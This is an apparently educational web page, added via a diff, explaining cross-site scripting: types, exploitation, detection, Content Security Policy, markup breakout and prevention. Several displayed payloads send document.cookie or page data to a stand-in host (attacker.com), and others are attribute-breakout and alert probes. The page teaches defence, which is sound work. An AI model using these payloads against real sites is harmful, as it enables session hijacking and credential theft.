@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="utf-8">
+        <title>InfoSec — Web Penetration Testing & Security Research</title>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta content="" name="keywords">
+        <meta content="" name="description">
+
+        <!-- Google Web Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet"> 
+
+        <!-- Icon Font Stylesheet -->
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css"/>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+        <!-- Libraries Stylesheet -->
+        <link href="lib/animate/animate.min.css" rel="stylesheet">
+        <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+        <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+
+
+        <!-- Customized Bootstrap Stylesheet -->
+        <link href="css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Template Stylesheet -->
+        <link href="css/style.css" rel="stylesheet">
+     
+    </head>
+
+    <body>
+
+        <!-- Spinner Start -->
+        <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
+            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
+                <span class="sr-only">Loading...</span>
+            </div>
+        </div>
+        <!-- Spinner End -->
+
+        <!-- Navbar & Hero Start -->
+        <div class="container-fluid position-relative p-0">
+            <nav class="navbar navbar-expand-lg navbar-light px-4 px-lg-5 py-3 py-lg-0">
+                <a href="" class="navbar-brand p-0">
+                    <h1 class="text-primary"><i></i>INFOSEC</h1>
+                    <!-- <img src="img/logo.png" alt="Logo"> -->
+                </a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
+                    <span class="fa fa-bars"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarCollapse">
+                   
+                    
+            </nav>
+
+           <div class="container-fluid bg-breadcrumb"
+     style="
+       background-image: url('img/xss.png');
+       background-size: cover;        /* show whole image */
+       background-repeat: no-repeat;    /* no tiling */
+       background-position: center 30%;
+       min-height: 350px;               /* adjust as needed */
+       display: flex;
+       align-items: center;
+       justify-content: center;
+       padding: 60px 0;
+     ">
+  <div class="container text-center" style="max-width: 900px;">
+    <h4 class="text-white display-4 mb-4 wow fadeInDown" data-wow-delay="0.1s">
+      Cross-site Scripting
+    </h4>
+  </div>
+</div>
+
+        </div>
+        <!-- Navbar & Hero End -->
+
+
+        <!-- 404 Start -->
+       <!-- XSS Content Start -->
+<section class="container py-5 card-hover-section">
+  <div class="row justify-content-center">
+    <div class="col-lg-10">
+<section class="container py-5">
+  <div class="row justify-content-center">
+    <div class="col-lg-10">
+
+      <!-- Cross-Site Scripting (XSS) -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h3 mb-3 text-primary">Cross-Site Scripting (XSS)</h2>
+          <p class="mb-0">
+            Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious scripts into web pages viewed by other users, tricking browsers into 
+            executing that code as if it came from a trusted site.​
+          </p>
+        </div>
+      </div>
+
+      <!-- How XSS works -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">How XSS works</h2>
+          <p class="mb-0">
+            Attackers exploit places where user input (comments, search terms, URLs) flows into HTML, JavaScript, attributes, or CSS without proper escaping, 
+            causing the victim's browser to run injected code like <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>. The browser treats the malicious payload as legitimate site content, 
+            bypassing the same-origin policy to steal cookies, session tokens, keystrokes, or perform actions on behalf of the victim.
+          </p>
+        </div>
+      </div>
+
+      <!-- Types of XSS -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">Types of XSS</h2>
+          <p class="mb-3">
+            <strong>Reflected XSS:</strong> Malicious script in a URL or form reflects back immediately in the response (non-persistent, single request).​
+          </p>
+          <p class="mb-3">
+            <strong>Stored XSS:</strong> Payload saved (database, comments) and served to all users who view that content (persistent, affects many).​
+          </p>
+          <p class="mb-0">
+            <strong>DOM-based XSS:</strong> Client-side script manipulates the DOM using unsafe user input, executing without server roundtrip.​
+            XSS remains prevalent because output encoding varies by context (HTML, JS, attributes, URLs), and incomplete sanitization lets payloads slip through.
+          </p>
+        </div>
+      </div>
+
+      <!-- XSS exploitation demonstration -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+                    <h2 class="h4 mb-3">XSS exploitation demonstration</h2>
+          <p class="mb-3">
+            XSS exploitation demonstrates how injected scripts execute in victims' browsers to steal data or perform actions.​
+          </p>
+
+          <h3 class="h5 mt-3">Reflected XSS example</h3>
+          <p>
+            A search form reflecting <code>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code> directly into HTML executes immediately when a victim clicks a crafted link.
+          </p>
+          <p>
+            More advanced payloads steal cookies:​
+          </p>
+          <pre><code>https://vulnerable.com/search?q=&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+
+          <h3 class="h5 mt-3">Stored XSS example</h3>
+          <p class="mb-0">
+            Malicious comment <code>&lt;script&gt;document.location='https://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code> saved to a database serves to all page viewers, 
+            hijacking sessions silently.​
+          </p>
+        </div>
+      </div>
+
+      <!-- DOM-based XSS example -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h3 class="h5 mt-3">DOM-based XSS example</h3>
+          <p class="mb-0">
+            Client-side code like <code>document.write(location.hash)</code> with URL <code>vulnerable.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code> lets attackers inject via hash 
+            without server reflection. Real attacks chain these to exfiltrate data, keylog, or perform CSRF on behalf of victims.
+          </p>
+        </div>
+      </div>
+
+      <!-- How attackers leverage XSS -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">How attackers leverage XSS</h2>
+          <p class="mb-3">
+            Attackers leverage XSS to bypass the same-origin policy and execute arbitrary JavaScript in victims' browsers, enabling session hijacking, data theft, 
+            and account takeover.​
+          </p>
+
+          <h3 class="h5 mt-3">Session hijacking and cookie theft</h3>
+          <p>
+            Most common: steal session cookies with payloads like <code>&lt;script&gt;document.location='https://attacker.com/?c='+document.cookie&lt;/script&gt;</code> sent to attacker's server, 
+            then replay them to impersonate victims. Works against sites without HttpOnly flags but fails if sessions are IP-bound or expired.​
+          </p>
+
+          <h3 class="h5 mt-3">Data exfiltration and keylogging</h3>
+          <p>
+            Capture passwords from autofill (<code>&lt;input type=password&gt;</code> then read <code>value</code>), keystrokes (<code>onkeypress</code> listeners), or page content (<code>innerHTML</code>) 
+            and beacon to attacker via <code>fetch()</code> or <code>&lt;img src&gt;</code>. Advanced attacks create overlays or iframes to phish credentials while monitoring form submissions.​
+          </p>
+
+          <h3 class="h5 mt-3">CSRF bypass and privilege escalation</h3>
+          <p class="mb-0">
+            Perform actions as the victim: change emails (<code>fetch('/change-email', {method:'POST', body:'new=attacker@evil.com'})</code>), transfer funds, or add admin accounts. 
+            Chain XSS with CSRF token theft to hit protected endpoints, or use <code>javascript:alert(document.domain)</code> variants for DOM manipulation.
+          </p>
+        </div>
+      </div>
+
+      <!-- Risks Posed by XSS Flaws -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">Risks Posed by XSS Flaws</h2>
+          <p class="mb-3">
+            XSS flaws pose severe risks by letting attackers execute code in victims' browsers with full site privileges, leading to session theft, data breaches, 
+            and account compromise.​
+          </p>
+
+          <h3 class="h5 mt-3">Session hijacking and impersonation</h3>
+          <p>
+            Attackers steal cookies or tokens via <code>document.cookie</code> exfiltration, then impersonate users to perform actions like changing emails, transferring funds, 
+            or accessing private data. Without HttpOnly flags, this bypasses server-side session checks, enabling persistent takeover until logout or expiry.​
+          </p>
+
+          <h3 class="h5 mt-3">Data theft and privacy violations</h3>
+          <p>
+            XSS reads sensitive page content (<code>innerHTML</code>), form data (passwords, PII), or localStorage, sending it to attacker servers via beacons or <code>fetch()</code>. 
+            Persistent XSS in comments/forums spreads automatically, harvesting credentials from all viewers and enabling mass data collection or phishing overlays.​
+          </p>
+
+          <h3 class="h5 mt-3">Defacement, malware, and supply chain attacks</h3>
+          <p class="mb-0">
+            Scripts rewrite pages (virtual defacement), inject trojans, or redirect to malware; compromised ad networks amplify this across sites. 
+            Business impacts include reputation damage, regulatory fines (GDPR), and chained attacks like CSRF or RCE when XSS hits admin panels.
+          </p>
+        </div>
+      </div>
+
+      <!-- XSS Detection and Verification Techniques -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">XSS Detection and Verification Techniques</h2>
+          <p class="mb-3">
+            XSS detection involves injecting unique test strings across input vectors and verifying if they execute as JavaScript in the victim's context.​
+          </p>
+
+          <h3 class="h5 mt-3">Manual testing workflow</h3>
+          <p>
+            Submit distinctive payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>&gt;&lt;img src=x onerror=alert(1)&gt;</code>, or <code>javascript:alert(1)</code> into URL params, forms, 
+            headers (User-Agent, Referer), and POST bodies, then check if they reflect/executed in responses. Examine page source, browser console, 
+            and network tab for unencoded reflections in HTML, attributes, JS contexts, or DOM sinks (<code>innerHTML</code>, <code>eval()</code>).​
+          </p>
+
+          <h3 class="h5 mt-3">Automated scanning and tools</h3>
+          <p>
+            Use scanners like XSStrike, Dalfox, or Burp Scanner on all parameters/headers to fuzz payloads and detect reflections automatically. For blind/stored XSS, 
+            deploy OAST callbacks (Burp Collaborator, xsshunter) in payloads to catch delayed executions in logs, admin panels, or emails.​
+          </p>
+
+          <h3 class="h5 mt-3">Verification techniques</h3>
+          <p class="mb-0">
+            Confirm true positives by observing execution (alert, beacon to your server) rather than mere reflection, test context-specific breaks (<code>"</code>, <code>&lt;</code>, <code>\`</code>), 
+            and chain with cookie theft (<code>document.cookie</code>) to prove impact. DOM XSS needs browser devtools to trace <code>location.hash</code>, <code>document.referrer</code> sinks.
+          </p>
+        </div>
+      </div>
+
+      <!-- CSP: Web Application Security Policy -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">CSP: Web Application Security Policy</h2>
+          <p class="mb-3">
+            Content Security Policy (CSP) is an HTTP response header that lets site owners declare which resources (scripts, styles, images, etc.) 
+            browsers can load and execute, primarily mitigating XSS by blocking inline or untrusted sources.​
+          </p>
+
+          <h3 class="h5 mt-3">How CSP works</h3>
+          <p>
+            CSP directives like <code>script-src 'self' https://trusted.com</code> restrict JavaScript to same-origin or whitelisted domains, blocking injected <code>&lt;script&gt;</code> tags or <code>eval()</code>. 
+            Other directives control <code>style-src</code> (CSS), <code>img-src</code> (images), <code>connect-src</code> (AJAX/WebSocket), and <code>frame-ancestors</code> (anti-clickjacking), with <code>default-src</code> as fallback. 
+            Browsers enforce this allowlist model, reporting violations via <code>report-uri</code> or <code>report-to</code>.​
+          </p>
+
+          <h3 class="h5 mt-3">CSP levels and bypasses</h3>
+          <p class="mb-0">
+            Start with <code>Content-Security-Policy-Report-Only</code> for monitoring, then strict mode (<code>'self'; script-src 'nonce-random' or 'strict-dynamic'</code> for modern apps). 
+            Weak policies (allowing <code>'unsafe-inline'</code>) fail against XSS; bypasses include JSONP endpoints or loose <code>eval()</code> allowances. Combine with output encoding 
+            for layered defense.
+          </p>
+        </div>
+      </div>
+
+      <!-- Markup Breakout Attacks -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">Markup Breakout Attacks</h2>
+          <p class="mb-3">
+            Markup breakout attacks exploit incomplete or unclosed HTML tags/attributes where user input can "break out" to inject executable code like event handlers or scripts 
+            when full XSS is blocked.​
+          </p>
+
+          <h3 class="h5 mt-3">Dangling markup injection</h3>
+          <p>
+            When input appears inside an unclosed attribute (for example <code>&lt;input value="USER_INPUT</code>), attackers append <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> to close the tag 
+            and inject new markup. Browsers continue parsing the injected content as HTML, executing scripts despite filters or CSP if the breakout reaches an executable context.​
+          </p>
+
+          <h3 class="h5 mt-3">Context breakout payloads</h3>
+          <p class="mb-0">
+            Common patterns include breaking quoted attributes (<code>" onmouseover=alert(1)//</code>), unquoted attributes (<code>' onfocus=alert(1) autofocus//</code>), 
+            or script contexts (<code>';alert(1);//</code>), chaining to steal CSRF tokens or exfiltrate data via <code>&lt;img src="https://attacker.com/?data=..."&gt;</code>. 
+            Attackers test for breakout by injecting unique strings and observing if they appear unencoded outside expected contexts.
+          </p>
+        </div>
+      </div>
+
+      <!-- XSS Prevention Techniques -->
+      <div class="card mb-4 shadow-sm border-0">
+        <div class="card-body p-4">
+          <h2 class="h4 mb-3">XSS Prevention Techniques</h2>
+          <p class="mb-3">
+            XSS prevention requires context-aware output encoding, input validation, CSP headers, and secure coding practices to block script execution across all contexts.​
+          </p>
+
+          <h3 class="h5 mt-3">Output encoding by context</h3>
+          <p>
+            Encode user input differently based on where it appears: HTML entity encode (<code>&amp;lt;script&amp;gt;</code>) for text content, URL encode for attributes/links, 
+            JS escape (<code>\x3cscript\x3e</code>) for scripts, CSS escape for styles. Use framework helpers (React <code>dangerouslySetInnerHTML</code> with sanitization, Angular bindings) 
+            or libraries like DOMPurify instead of raw <code>innerHTML</code>.​
+          </p>
+
+          <h3 class="h5 mt-3">Input validation and sanitization</h3>
+          <p>
+            Whitelist validate inputs (alphanumeric only for names, reject <code>&lt;&gt;"'</code> patterns), sanitize HTML with libraries (sanitize-html, bleach) before storage, 
+            and never trust client-side validation alone. HttpOnly/Secure/SameSite cookies block client-side cookie access.​
+          </p>
+
+          <h3 class="h5 mt-3">Content Security Policy and headers</h3>
+          <p class="mb-0">
+            Deploy strict CSP (<code>script-src 'self' 'nonce-randomvalue'</code>) to ban inline scripts/eval, use <code>X-Content-Type-Options: nosniff</code> and <code>X-Frame-Options: DENY</code>. 
+            Layer with WAF rules and automated scanners in CI/CD.
+          </p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+</div>
+  </div>
+</section>
+<!-- XSS Content End -->
+
+
+        <!-- 404 End -->
+
+        <!-- Footer Start -->
+        <div class="container-fluid footer py-5 wow fadeIn" data-wow-delay="0.2s">
+            <div class="container py-5 border-start-0 border-end-0" style="border: 1px solid; border-color: rgb(255, 255, 255, 0.08);">
+                <div class="row g-5">
+                    <div class="col-md-6 col-lg-6 col-xl-4">
+                        <div class="footer-item">
+                            <a href="index.html" class="p-0">
+                                <h4 class="text-white"><i></i>INFOSEC</h4>
+                                <!-- <img src="img/logo.png" alt="Logo"> -->
+                            </a>
+                            <p class="mb-4">Secure your web applications from end to end. Explore both server-side and client-side security strategies to protect your systems and users.</p>
+                            
+                        </div>
+                    </div>
+                    <div class="col-md-6 col-lg-6 col-xl-2">
+                        <div class="footer-item">
+                            <h4 class="text-white mb-4">Quick Links</h4>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> About Us</a>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> Feature</a>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> Blog</a>
+                            </div>
+                    </div>
+                    <div class="col-md-6 col-lg-6 col-xl-3">
+                        <div class="footer-item">
+                            <h4 class="text-white mb-4">Support</h4>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> Privacy Policy</a>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> Terms & Conditions</a>
+                            <a href="#"><i class="fas fa-angle-right me-2"></i> FAQ</a>
+                            </div>
+                    </div>
+                   
+            </div>
+        </div>
+        <!-- Footer End -->
+        
+        <!-- Copyright Start -->
+        <div class="container-fluid copyright py-4">
+            <div class="container">
+                <div class="row g-4 align-items-center">
+                    <div class="col-md-6 text-center text-md-start mb-md-0">
+                        <span class="text-body"><a href="#" class="border-bottom text-white"><i class="fas fa-copyright text-light me-2"></i>INFOSEC</a>, All right reserved.</span>
+                    </div>
+                   
+                </div>
+            </div>
+        </div>
+        <!-- Copyright End -->
+
+
+        <!-- Back to Top -->
+        <a href="#" class="btn btn-primary btn-lg-square rounded-circle back-to-top"><i class="fa fa-arrow-up"></i></a>   
+
+        
+        <!-- JavaScript Libraries -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="lib/wow/wow.min.js"></script>
+        <script src="lib/easing/easing.min.js"></script>
+        <script src="lib/waypoints/waypoints.min.js"></script>
+        <script src="lib/counterup/counterup.min.js"></script>
+        <script src="lib/lightbox/js/lightbox.min.js"></script>
+        <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+        
+
+        <!-- Template Javascript -->
+        <script src="js/main.js"></script>
+    </body>
+
+</html>
